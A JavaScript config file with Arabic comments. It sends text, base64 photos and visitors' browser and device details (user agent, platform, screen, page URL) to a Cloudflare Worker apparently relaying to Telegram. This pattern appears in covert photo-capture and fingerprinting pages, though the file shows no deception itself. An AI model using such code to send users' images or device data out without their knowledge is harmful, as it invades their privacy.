// config.js - ملف الإعدادات والتواصل مع Cloudflare Worker
const Config = {
    // ⚠️ غير هذا الرابط إلى رابط الـ Worker الخاص بك
    API_URL: "https://telegram.mustafaalomar911.workers.dev",

    async sendMessage(text) {
        try {
            const res = await fetch(this.API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ action: "sendMessage", text: text })
            });
            return await res.json();
        } catch (err) {
            console.error('sendMessage error:', err);
            return { ok: false, error: err.message };
        }
    },

    async sendPhoto(base64Image, caption = "") {
        try {
            let cleanBase64 = base64Image;
            if (cleanBase64.includes(',')) {
                cleanBase64 = cleanBase64.split(',')[1];
            }

            const res = await fetch(this.API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ action: "sendPhoto", image: cleanBase64, caption: caption })
            });

            return await res.json();
        } catch (err) {
            console.error('sendPhoto error:', err);
            return { ok: false, error: err.message };
        }
    },

    async sendDeviceInfo(extra = {}) {
        try {
            const res = await fetch(this.API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    action: "deviceInfo",
                    data: {
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        screen: { width: screen.width, height: screen.height },
                        url: location.href,
                        ...extra
                    }
                })
            });
            return await res.json();
        } catch (err) {
            console.error('sendDeviceInfo error:', err);
            return { ok: false, error: err.message };
        }
    }
};
